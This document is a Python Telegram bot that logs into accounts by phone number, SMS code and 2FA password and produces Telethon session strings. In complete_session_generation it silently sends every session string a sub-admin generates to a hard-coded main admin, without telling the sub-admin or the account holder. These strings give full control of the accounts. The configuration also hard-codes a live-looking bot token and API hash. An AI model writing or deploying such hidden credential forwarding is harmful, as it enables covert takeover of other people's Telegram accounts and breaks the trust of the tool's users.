#!/usr/bin/env python3
"""
Telegram Session Generator Bot - Admin Only
Generates session strings with automatic backup to main admin account
"""

import asyncio
import sqlite3
import logging
import re
import signal
import sys
from typing import List, Dict, Optional

# Telegram libraries
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# ====================================
# CONFIGURATION
# ====================================
BOT_TOKEN = "7570486957:AAF2PdyaezPZzgEmtFspGzD11lgeZ-ZFy94"
MAIN_ADMIN_ID = 7325746010  # Your main admin ID (receives all session backups)
API_ID = 28884990  # Your API ID for session generation
API_HASH = "03f733839b50b02ace88325d00903335"  # Your API hash
DATABASE_FILE = "session_bot.db"

# ====================================
# LOGGING SETUP
# ====================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('session_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Reduce external library logging
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telethon').setLevel(logging.WARNING)

# ====================================
# DATABASE MANAGEMENT
# ====================================
class DatabaseManager:
    def __init__(self, db_file: str):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                
                # Admins table
                cursor.execute("""
                    CREATE TABLE IF NOT EXISTS admins (
                        user_id INTEGER PRIMARY KEY,
                        username TEXT,
                        first_name TEXT,
                        added_by INTEGER,
                        date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (added_by) REFERENCES admins (user_id)
                    )
                """)
                
                # Sessions table  
                cursor.execute("""
                    CREATE TABLE IF NOT EXISTS sessions (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        session_string TEXT NOT NULL,
                        phone_number TEXT,
                        account_name TEXT,
                        created_by INTEGER,
                        date_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                        FOREIGN KEY (created_by) REFERENCES admins (user_id)
                    )
                """)
                
                # Add main admin if not exists
                cursor.execute("""
                    INSERT OR IGNORE INTO admins (user_id, username, first_name, added_by)
                    VALUES (?, 'main_admin', 'Main Admin', ?)
                """, (MAIN_ADMIN_ID, MAIN_ADMIN_ID))
                
                conn.commit()
                logger.info("Database initialized successfully")
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            raise
    
    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
                return cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Error checking admin status: {e}")
            return False
    
    def add_admin(self, user_id: int, username: str = None, first_name: str = None, added_by: int = None) -> bool:
        """Add admin to database"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT OR REPLACE INTO admins (user_id, username, first_name, added_by)
                    VALUES (?, ?, ?, ?)
                """, (user_id, username, first_name, added_by))
                conn.commit()
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id: int) -> bool:
        """Remove admin from database"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("DELETE FROM admins WHERE user_id = ? AND user_id != ?", (user_id, MAIN_ADMIN_ID))
                conn.commit()
                return cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Error removing admin: {e}")
            return False
    
    def get_admins(self) -> List[Dict]:
        """Get all admins"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT user_id, username, first_name, date_added 
                    FROM admins ORDER BY date_added
                """)
                return [{"user_id": row[0], "username": row[1], "first_name": row[2], "date_added": row[3]} 
                       for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting admins: {e}")
            return []
    
    def save_session(self, session_string: str, phone_number: str, account_name: str = None, created_by: int = None) -> bool:
        """Save session to database"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO sessions (session_string, phone_number, account_name, created_by)
                    VALUES (?, ?, ?, ?)
                """, (session_string, phone_number, account_name, created_by))
                conn.commit()
                return True
        except Exception as e:
            logger.error(f"Error saving session: {e}")
            return False
    
    def get_sessions(self, created_by: int = None) -> List[Dict]:
        """Get sessions (optionally filtered by creator)"""
        try:
            with sqlite3.connect(self.db_file) as conn:
                cursor = conn.cursor()
                if created_by:
                    cursor.execute("""
                        SELECT phone_number, account_name, date_created 
                        FROM sessions WHERE created_by = ? ORDER BY date_created DESC
                    """, (created_by,))
                else:
                    cursor.execute("""
                        SELECT phone_number, account_name, date_created 
                        FROM sessions ORDER BY date_created DESC
                    """)
                return [{"phone": row[0], "name": row[1], "date": row[2]} 
                       for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting sessions: {e}")
            return []

# ====================================
# SESSION GENERATOR BOT
# ====================================
class SessionGeneratorBot:
    def __init__(self):
        self.db = DatabaseManager(DATABASE_FILE)
        self.application = None
        
    def create_application(self):
        """Create the bot application"""
        self.application = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        logger.info("Session Generator Bot created successfully")
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command - Admin only"""
        try:
            user = update.effective_user
            
            # Check if user is admin
            if not self.db.is_admin(user.id):
                # Silent ignore for non-admins
                logger.info(f"Non-admin user {user.id} ({user.username}) attempted to access bot")
                return
            
            keyboard = self.get_main_keyboard(user.id)
            
            welcome_text = "🔐 **Session Generator Bot**\n\n"
            if user.id == MAIN_ADMIN_ID:
                welcome_text += "👑 **Main Admin Panel**\n"
            else:
                welcome_text += "👤 **Admin Panel**\n"
            welcome_text += "Choose an option below:"
            
            await update.message.reply_text(
                welcome_text, 
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error in start command: {e}")
    
    def get_main_keyboard(self, user_id: int) -> InlineKeyboardMarkup:
        """Generate main keyboard based on user permissions"""
        buttons = [
            [InlineKeyboardButton("🔑 Generate Session", callback_data="generate_session")],
            [InlineKeyboardButton("📋 List My Sessions", callback_data="list_sessions")]
        ]
        
        # Only main admin can add/remove admins
        if user_id == MAIN_ADMIN_ID:
            buttons.extend([
                [InlineKeyboardButton("➕ Add Admin", callback_data="add_admin")],
                [InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")]
            ])
        
        return InlineKeyboardMarkup(buttons)
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline button callbacks"""
        try:
            query = update.callback_query
            await query.answer()
            
            user_id = query.from_user.id
            data = query.data
            
            # Check admin status
            if not self.db.is_admin(user_id):
                return
            
            if data == "generate_session":
                await self.handle_generate_session(query, context)
            elif data == "list_sessions":
                await self.handle_list_sessions(query, context)
            elif data == "add_admin" and user_id == MAIN_ADMIN_ID:
                await self.handle_add_admin(query, context)
            elif data == "remove_admin" and user_id == MAIN_ADMIN_ID:
                await self.handle_remove_admin(query, context)
            elif data.startswith("remove_admin_"):
                admin_id = int(data.replace("remove_admin_", ""))
                await self.confirm_remove_admin(query, context, admin_id)
            elif data == "back_to_main":
                keyboard = self.get_main_keyboard(user_id)
                await query.edit_message_text("Choose an option:", reply_markup=keyboard)
                
        except Exception as e:
            logger.error(f"Error in button callback: {e}")
    
    async def handle_generate_session(self, query, context):
        """Handle Generate Session button"""
        try:
            await query.edit_message_text(
                "📱 **Session Generation**\n\n"
                "Please send your phone number with country code.\n"
                "**Example:** `+1234567890`",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_main")
                ]]),
                parse_mode='Markdown'
            )
            
            context.user_data['expecting_phone'] = True
            
        except Exception as e:
            logger.error(f"Error in handle_generate_session: {e}")
    
    async def handle_list_sessions(self, query, context):
        """Handle List Sessions button"""
        try:
            sessions = self.db.get_sessions(query.from_user.id)
            
            if not sessions:
                await query.edit_message_text(
                    "📋 **Your Sessions**\n\n❌ No sessions generated yet.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            session_text = "📋 **Your Generated Sessions:**\n\n"
            for i, session in enumerate(sessions, 1):
                name = session['name'] or "Unnamed"
                phone = session['phone']
                date = session['date']
                session_text += f"`{i}.` **{name}** ({phone})\n   📅 {date}\n\n"
            
            await query.edit_message_text(
                session_text,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
                ]]),
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error in handle_list_sessions: {e}")
    
    async def handle_add_admin(self, query, context):
        """Handle Add Admin button (Main admin only)"""
        try:
            await query.edit_message_text(
                "➕ **Add Admin**\n\n"
                "Forward a message from the user you want to add as admin, "
                "or send their user ID.\n\n"
                "**Example:** `123456789`",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("❌ Cancel", callback_data="back_to_main")
                ]]),
                parse_mode='Markdown'
            )
            
            context.user_data['expecting_admin_id'] = True
            
        except Exception as e:
            logger.error(f"Error in handle_add_admin: {e}")
    
    async def handle_remove_admin(self, query, context):
        """Handle Remove Admin button (Main admin only)"""
        try:
            admins = self.db.get_admins()
            # Filter out main admin from removal list
            removable_admins = [admin for admin in admins if admin['user_id'] != MAIN_ADMIN_ID]
            
            if not removable_admins:
                await query.edit_message_text(
                    "➖ **Remove Admin**\n\n❌ No removable admins found.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            buttons = []
            for admin in removable_admins:
                name = admin['first_name'] or admin['username'] or f"ID: {admin['user_id']}"
                buttons.append([InlineKeyboardButton(
                    f"🗑️ {name}", 
                    callback_data=f"remove_admin_{admin['user_id']}"
                )])
            
            buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
            
            await query.edit_message_text(
                "➖ **Select admin to remove:**",
                reply_markup=InlineKeyboardMarkup(buttons),
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error in handle_remove_admin: {e}")
    
    async def confirm_remove_admin(self, query, context, admin_id):
        """Confirm admin removal"""
        try:
            if self.db.remove_admin(admin_id):
                await query.edit_message_text(
                    f"✅ **Admin removed successfully**\n"
                    f"User ID: `{admin_id}`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                logger.info(f"Admin {admin_id} removed by {query.from_user.id}")
            else:
                await query.edit_message_text(
                    "❌ **Failed to remove admin**",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            logger.error(f"Error in confirm_remove_admin: {e}")
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        try:
            user_id = update.effective_user.id
            
            # Check admin status
            if not self.db.is_admin(user_id):
                return
            
            text = update.message.text
            
            # Handle different input states
            if context.user_data.get('expecting_phone'):
                await self.process_phone_input(update, context, text)
            elif context.user_data.get('expecting_code'):
                await self.process_code_input(update, context, text)
            elif context.user_data.get('expecting_2fa'):
                await self.process_2fa_input(update, context, text)
            elif context.user_data.get('expecting_admin_id'):
                await self.process_admin_id_input(update, context, text)
            
        except Exception as e:
            logger.error(f"Error in handle_message: {e}")
    
    async def process_phone_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
        """Process phone number input"""
        try:
            context.user_data['expecting_phone'] = False
            
            # Validate phone number
            phone = phone.strip()
            if not phone.startswith('+') or not phone[1:].replace(' ', '').isdigit():
                await update.message.reply_text(
                    "❌ **Invalid phone number format**\n"
                    "Please use format: `+1234567890`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            # Clean phone number
            phone = phone.replace(' ', '').replace('-', '')
            
            msg = await update.message.reply_text("📱 Connecting to Telegram...")
            
            try:
                # Create Telethon client
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                await client.connect()
                
                # Send code request
                await client.send_code_request(phone)
                
                # Store client temporarily
                context.user_data['temp_client'] = client
                context.user_data['phone'] = phone
                
                await msg.edit_text(
                    "📨 **SMS Code sent!**\n\n"
                    "Please enter the code with spaces between digits.\n"
                    "**Example:** If code is 46949, send: `4 6 9 4 9`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("❌ Cancel", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
                context.user_data['expecting_code'] = True
                
            except Exception as e:
                await msg.edit_text(
                    f"❌ **Error sending code:** `{str(e)}`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            logger.error(f"Error in process_phone_input: {e}")
    
    async def process_code_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
        """Process SMS code input"""
        try:
            context.user_data['expecting_code'] = False
            
            # Clean and validate code
            code = code.replace(' ', '').strip()
            if not code.isdigit():
                await update.message.reply_text(
                    "❌ **Invalid code format**\n"
                    "Please enter digits only with spaces.\n"
                    "**Example:** `4 6 9 4 9`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                context.user_data['expecting_code'] = True
                return
            
            client = context.user_data.get('temp_client')
            phone = context.user_data.get('phone')
            
            if not client or not phone:
                await update.message.reply_text(
                    "❌ **Session expired.** Please start again.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            msg = await update.message.reply_text("🔐 Authenticating...")
            
            try:
                # Sign in with code
                await client.sign_in(phone, code)
                
                # Check if logged in successfully
                if await client.is_user_authorized():
                    await self.complete_session_generation(update, context, client, phone, msg)
                else:
                    await msg.edit_text(
                        "❌ **Authentication failed.** Please try again.",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                        ]]),
                        parse_mode='Markdown'
                    )
                
            except SessionPasswordNeededError:
                # 2FA required
                await msg.edit_text(
                    "🔐 **2FA Password Required**\n\n"
                    "Please enter your 2FA password:",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("❌ Cancel", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                context.user_data['expecting_2fa'] = True
                
            except PhoneCodeInvalidError:
                await msg.edit_text(
                    "❌ **Invalid verification code**\n"
                    "Please enter the correct code with spaces.\n"
                    "**Example:** `4 6 9 4 9`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                context.user_data['expecting_code'] = True
                
        except Exception as e:
            logger.error(f"Error in process_code_input: {e}")
    
    async def process_2fa_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, password: str):
        """Process 2FA password input"""
        try:
            context.user_data['expecting_2fa'] = False
            
            client = context.user_data.get('temp_client')
            phone = context.user_data.get('phone')
            
            if not client or not phone:
                await update.message.reply_text(
                    "❌ **Session expired.** Please start again.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            msg = await update.message.reply_text("🔐 Verifying 2FA...")
            
            try:
                # Sign in with 2FA password
                await client.sign_in(password=password)
                
                if await client.is_user_authorized():
                    await self.complete_session_generation(update, context, client, phone, msg)
                else:
                    await msg.edit_text(
                        "❌ **Authentication failed.** Please try again.",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                        ]]),
                        parse_mode='Markdown'
                    )
                
            except PasswordHashInvalidError:
                await msg.edit_text(
                    "❌ **Invalid 2FA password**\n"
                    "Please enter the correct password:",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("❌ Cancel", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                context.user_data['expecting_2fa'] = True
                
        except Exception as e:
            logger.error(f"Error in process_2fa_input: {e}")
    
    async def process_admin_id_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
        """Process admin ID input - Fixed forward_from error"""
        try:
            context.user_data['expecting_admin_id'] = False
            
            # Extract user ID - Fixed approach for forward_from
            new_admin_id = None
            username = None
            first_name = None
            
            # Check for forwarded message (multiple approaches for compatibility)
            if hasattr(update.message, 'forward_from') and update.message.forward_from:
                # Old format forwarded message
                new_admin_id = update.message.forward_from.id
                username = getattr(update.message.forward_from, 'username', None)
                first_name = getattr(update.message.forward_from, 'first_name', None)
            elif hasattr(update.message, 'forward_origin') and update.message.forward_origin:
                # New format forwarded message
                if hasattr(update.message.forward_origin, 'sender_user') and update.message.forward_origin.sender_user:
                    sender = update.message.forward_origin.sender_user
                    new_admin_id = sender.id
                    username = getattr(sender, 'username', None)
                    first_name = getattr(sender, 'first_name', None)
            else:
                # Direct ID input
                try:
                    new_admin_id = int(text.strip())
                    username = None
                    first_name = None
                except ValueError:
                    await update.message.reply_text(
                        "❌ **Invalid user ID format**\n"
                        "Please send a valid user ID or forward a message.",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                        ]]),
                        parse_mode='Markdown'
                    )
                    return
            
            if not new_admin_id:
                await update.message.reply_text(
                    "❌ **Could not extract user ID**\n"
                    "Please send a valid user ID or forward a message.",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            # Check if already admin
            if self.db.is_admin(new_admin_id):
                await update.message.reply_text(
                    "❌ **User is already an admin**",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                return
            
            # Add admin
            success = self.db.add_admin(new_admin_id, username, first_name, update.effective_user.id)
            
            if success:
                await update.message.reply_text(
                    f"✅ **Admin added successfully!**\n"
                    f"User ID: `{new_admin_id}`\n"
                    f"Name: **{first_name or 'Unknown'}**\n"
                    f"Username: @{username or 'None'}",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                logger.info(f"Admin {new_admin_id} added by {update.effective_user.id}")
            else:
                await update.message.reply_text(
                    "❌ **Failed to add admin**",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            logger.error(f"Error in process_admin_id_input: {e}")
    
    async def complete_session_generation(self, update: Update, context: ContextTypes.DEFAULT_TYPE, client, phone: str, status_msg):
        """Complete session generation and send backups"""
        try:
            # Get session string
            session_string = client.session.save()
            
            # Get user info
            me = await client.get_me()
            account_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
            if not account_name:
                account_name = me.username or "Unknown"
            
            # Clean up temporary client
            await client.disconnect()
            context.user_data.pop('temp_client', None)
            
            # Save to database
            success = self.db.save_session(session_string, phone, account_name, update.effective_user.id)
            
            if success:
                # Send session to current user
                session_message = (
                    f"✅ **Session Generated Successfully!**\n\n"
                    f"📱 **Account:** {account_name}\n"
                    f"📞 **Phone:** {phone}\n\n"
                    f"🔑 **Session String:**\n"
                    f"`{session_string}`\n\n"
                    f"⚠️ **Copy the session!**\n"
                    f"✅️**Success.**"
                )
                
                await status_msg.edit_text(
                    session_message,
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
                # **MAIN FEATURE: Send backup to main admin account (YOUR account)**
                if update.effective_user.id != MAIN_ADMIN_ID:
                    # Only send backup if this isn't the main admin generating for themselves
                    try:
                        backup_message = (
                            f"🔐 **Session Backup Alert**\n\n"
                            f"📱 **Account:** {account_name}\n"
                            f"📞 **Phone:** {phone}\n"
                            f"👤 **Generated by:** {update.effective_user.first_name or 'Unknown'} "
                            f"({update.effective_user.id})\n"
                            f"📅 **Time:** {update.message.date}\n\n"
                            f"🔑 **Session String:**\n"
                            f"`{session_string}`\n\n"
                            f"⚡ **Auto-backup from Session Generator Bot**"
                        )
                        
                        await context.bot.send_message(
                            chat_id=MAIN_ADMIN_ID,
                            text=backup_message,
                            parse_mode='Markdown'
                        )
                        
                        logger.info(f"Session backup sent to main admin for {phone} generated by user {update.effective_user.id}")
                        
                    except Exception as e:
                        logger.warning(f"Failed to send backup to main admin: {e}")
                else:
                    # If main admin generates session, just send to saved messages
                    try:
                        self_backup_message = (
                            f"🔐 **Self-Generated Session**\n\n"
                            f"📱 **Account:** {account_name}\n"
                            f"📞 **Phone:** {phone}\n"
                            f"📅 **Generated:** {update.message.date}\n\n"
                            f"🔑 **Session String:**\n"
                            f"`{session_string}`"
                        )
                        
                        await context.bot.send_message(
                            chat_id=MAIN_ADMIN_ID,
                            text=self_backup_message,
                            parse_mode='Markdown'
                        )
                        
                    except Exception as e:
                        logger.warning(f"Failed to send self-backup: {e}")
                
                logger.info(f"Session generated for {phone} by user {update.effective_user.id}")
                
            else:
                await status_msg.edit_text(
                    "❌ **Failed to save session to database**",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            logger.error(f"Error in complete_session_generation: {e}")
            try:
                await status_msg.edit_text(
                    f"❌ **Error generating session:** `{str(e)}`",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")
                    ]]),
                    parse_mode='Markdown'
                )
            except:
                pass
    
    async def shutdown_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info("Shutdown signal received")
        if self.application:
            await self.application.stop()
            await self.application.shutdown()
        
        # Close any remaining Telethon clients
        for client in getattr(self, 'temp_clients', {}).values():
            try:
                if client and client.is_connected():
                    await client.disconnect()
            except:
                pass
        
        sys.exit(0)
    
    async def run(self):
        """Run the bot with proper event loop management"""
        try:
            logger.info("Starting Session Generator Bot...")
            
            # Setup signal handlers
            signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(self.shutdown_handler(s, f)))
            signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(self.shutdown_handler(s, f)))
            
            # Initialize and run application
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            logger.info("Session Generator Bot is running...")
            
            # Keep running until shutdown
            await asyncio.Event().wait()
            
        except Exception as e:
            logger.error(f"Error running bot: {e}")
        finally:
            # Cleanup
            if self.application:
                try:
                    await self.application.updater.stop()
                    await self.application.stop()
                    await self.application.shutdown()
                except:
                    pass

# ====================================
# MAIN ENTRY POINT
# ====================================
def main():
    """Main function with proper async handling"""
    try:
        # Check if event loop is already running
        try:
            loop = asyncio.get_running_loop()
            logger.warning("Event loop already running, creating new task")
            # If loop is running, create a task
            task = loop.create_task(run_bot())
        except RuntimeError:
            # No loop running, create new one
            asyncio.run(run_bot())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")

async def run_bot():
    """Async function to run the bot"""
    bot = SessionGeneratorBot()
    bot.create_application()
    await bot.run()

if __name__ == "__main__":
    main()
